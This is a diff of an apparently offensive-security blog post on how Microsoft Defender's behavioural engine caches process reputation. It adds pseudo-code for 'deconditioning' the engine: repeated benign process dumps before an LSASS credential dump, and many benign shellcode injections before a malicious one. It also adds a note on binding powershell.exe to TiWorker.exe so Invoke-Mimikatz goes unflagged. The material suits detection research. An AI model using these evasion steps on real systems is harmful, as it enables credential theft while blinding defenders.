@@ -8,6 +8,35 @@
 ## Acknowlegdements
 The following theory and pseudo-code is based on my and [Dobins](https://blog.deeb.ch) experience and exchange on the matter.
 
+## TL;DR
+### LSASS Dumping
+```cpp
+// usual dumping
+MiniDumpWriteDump(lsassHandle, lsassPID, outHandle, MiniDumpWithFullMemory, NULL, NULL, NULL); // blocked 
+
+// deconditioning
+for (int i = 0; i < 20; i++) {
+    MiniDumpWriteDump(explorerHandle, explorerPID, outHandle, MiniDumpWithFullMemory, NULL, NULL, NULL); // ok 
+}
+MiniDumpWriteDump(lsassHandle, lsassPID, outHandle, MiniDumpWithFullMemory, NULL, NULL, NULL); // ok --> profit
+```
+
+### Shellcode Injection
+```cpp
+// usual injection
+LPVOID remAddr = VirtualAllocEx(hProc, nullptr, sizeof(shellcode), ...);
+WriteProcessMemory(hProc, remAddr, &shellcode, ...);
+CreateRemoteThread(hProc, nullptr, 0, remAddr, ...); // EDR likely scans memory, detects the malicious shellcode
+
+// deconditioning (SirAllocALot)
+for (int i = 0; i < 1000; i++) {
+    VirtualAllocEx(); WriteProcessMemory(beningShellcode); CreateRemoteThread();
+}
+LPVOID remAddr = VirtualAllocEx(hProc, nullptr, sizeof(shellcode), ...);
+WriteProcessMemory(hProc, remAddr, &shellcode, ...);
+CreateRemoteThread(hProc, nullptr, 0, remAddr, ...); // no more scans
+```
+
 ## Related Work
 If you don't know what a behavioural engine or behavioural tracking is, have a look at [Detection Engines](/post/2025-12-04-defender-detection-engines) first.<br>
 If you do not believe the results, see [Temporal Detections](/post/2025-12-02-defender-temporal-detections) where the observations stem from.<br>
@@ -19,14 +48,15 @@ If you do not believe the results, see [Temporal Detections](/post/2025-12-02-de
 3. EDRs have some "process identification" mechanism. This might be `hash(code_section)`, `imphash(x.exe)` or `metadata(x.exe)`. This allows to store only the identifier for lookups.
 
 ### Definitions
-1. Let's call this process identification `PI(x.exe)`, for now it does not matter how it works exactly.
+1. Process identification is defined as `PI(x.exe)`, for now it does not matter how it works exactly.
+2. Deconditioning means "doing a similar, but non malicious action". In the context of lsass dumping this means dumping non-critical processes. In the context of running injected malicious shellcode this means running benign shellcode like `xor eax, eax; ret`.
 
-### Observations
-1. A.exe is executed, it does some deconditioning (dump 20 other procs), then A.exe dumps lsass. -> <b>undetected</b> -> expected
-2. A'.exe is executed, directly dumps lsass. -> <b>UNDETECTED</b> -> unexpected!
+### Observations regarding Decon and PI
+1. A.exe is executed, it deconditions MDE (dump 20 other procs), then A.exe dumps lsass. -> <b>works</b> -> expected
+2. A'.exe is executed, directly dumps lsass. -> <b>works</b> -> unexpected!
 3. <i>Wait some time (~1h), or let A'.exe raise a non-behaviour alert (i.e. signature, memory, ..., does not matter how).</i>
-4. A'.exe is executed again, directly dumps lsass. -> <b>detected</b> -> expected
-5. A.exe is executed again, deconditioning, then dumps lsass.exe -> <b>DETECTED</b> -> unexpected!
+4. A'.exe is executed again, directly dumps lsass. -> <b>blocked</b> -> expected
+5. A.exe is executed again, deconditioning, then dumps lsass.exe -> <b>blocked</b> -> unexpected!
 
 ### Lemmas
 1. From the remarks it follows that `A.exe != A'.exe`
@@ -122,3 +152,8 @@ cache = {
                 return true # ALERT!
             # else: rule checked but no suspicious action found, continue
 ```
+* Bitdefender's talk at Insomni'hack 2026 revealed that `Invoke-Mimikatz` does **not trigger** an alert, when `C:\path\to\powershell.exe` is overwritten with a bind link to `C:\path\to\TiWorker.exe`, see [Talk Overview](https://insomnihack.ch/talks/silo-binding-uncovering-the-ghost-in-the-silo/) and [Video not yet released]()
+  * This is yet another indication of behaviour bypass, it should additionally be verified with:
+    * LsassDump.exe with no rebinding (no deconditioning) -> expect block
+    * LsassDump.exe with rebinding to edge.exe -> may be blocked, edge.exe not fully trusted
+    * LsassDump.exe with rebinding to TiWorker.exe -> expect bypass, TiWorker.exe trusted
